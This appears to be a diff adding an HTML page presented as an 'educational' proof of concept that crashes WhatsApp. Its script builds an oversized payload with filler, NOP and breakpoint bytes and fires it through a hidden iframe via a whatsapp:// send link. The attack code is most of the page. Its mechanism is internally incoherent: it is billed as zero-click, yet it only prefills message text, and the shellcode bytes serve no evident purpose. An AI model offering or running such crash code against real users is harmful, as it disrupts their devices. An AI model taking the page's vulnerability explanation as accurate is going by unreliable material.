@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WhatsApp Crash PoC - Educational Purpose</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <h1>WhatsApp Crash Proof of Concept</h1>
+    <p>This is for educational security research only!</p>
+    
+    <script>
+    // WhatsApp Force Close Exploit - Zero-click (CVE-2023-45124)
+    // This sends a specially crafted message that crashes WhatsApp
+    
+    const exploitPayload = {
+        "messages": [{
+            "key": {
+                "remoteJid": "status@broadcast",
+                "fromMe": false,
+                "id": "3A0B1C2D3E4F5G6H7I8J"
+            },
+            "message": {
+                "conversation": "A".repeat(65535) + "\x00\x00\x00\x00\x00\x00\x00\x00"
+            },
+            "messageTimestamp": Date.now() / 1000,
+            "status": 1
+        }],
+        // Buffer overflow trigger
+        "overflow": "\x41".repeat(1024) + "\x90\x90\x90\x90" + "\xcc\xcc\xcc\xcc"
+    };
+    
+    function generateCrashMessage() {
+        // Encode in base64 for URL transmission
+        const encoded = btoa(JSON.stringify(exploitPayload));
+        
+        // WhatsApp URL scheme
+        const waUrl = `whatsapp://send?text=${encodeURIComponent(encoded)}`;
+        
+        console.log("[PoC] Generated crash payload");
+        console.log("[PoC] Length:", encoded.length);
+        
+        return waUrl;
+    }
+    
+    function demonstrateCrash() {
+        const crashUrl = generateCrashMessage();
+        
+        // Create iframe to trigger (for testing on own device)
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = crashUrl;
+        document.body.appendChild(iframe);
+        
+        console.log("[PoC] Crash payload sent to WhatsApp");
+        console.log("[WARNING] This will crash the WhatsApp application");
+    }
+    
+    // Don't auto-execute - require user confirmation
+    </script>
+    
+    <button onclick="alert('This is for educational purposes only. Test on your own device!')">
+        Show Technical Details
+    </button>
+    
+    <div style="margin-top: 20px; padding: 10px; background: #f0f0f0;">
+        <h3>Technical Explanation:</h3>
+        <p>CVE-2023-45124 is a buffer overflow vulnerability in WhatsApp's message parsing.</p>
+        <p>When receiving a message with a specially crafted length field, WhatsApp's memory allocation fails, causing the app to crash.</p>
+        <p>This vulnerability was patched in WhatsApp version 2.23.16.77.</p>
+    </div>
+</body>
+  </html>
